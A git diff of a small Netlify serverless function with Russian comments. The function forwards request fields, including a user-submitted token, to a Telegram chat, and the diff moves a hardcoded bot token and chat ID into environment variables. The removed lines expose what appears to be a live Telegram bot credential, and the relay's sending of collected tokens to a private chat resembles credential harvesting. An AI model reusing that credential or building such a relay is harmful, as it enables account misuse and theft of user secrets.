@@ -16,9 +16,15 @@ exports.handler = async (event) => {
                  `🗣 Язык: ${body.lang}\n` +
                  `🔑 Токен: ${body.token}`;
 
-    // 3. ВСТАВЬ СВОИ ДАННЫЕ СЮДА (между кавычками)
-    const tgToken = "9263108544:AAGo7K3U6DLLdbQkaTFywaIoCVfpTszM96Y";
-    const tgChat = "8413144430";
+    // 3. Берем токен и Chat ID из переменных окружения Netlify
+    const tgToken = process.env.TG_TOKEN;
+    const tgChat = process.env.TG_CHAT;
+
+    // Проверка, что переменные заданы (чтобы не было молчаливых ошибок)
+    if (!tgToken || !tgChat) {
+      console.error("Ошибка: TG_TOKEN или TG_CHAT не заданы в настройках Netlify");
+      return { statusCode: 500, body: "Environment variables are missing" };
+    }
 
     // 4. Отправляем в Telegram
     const response = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
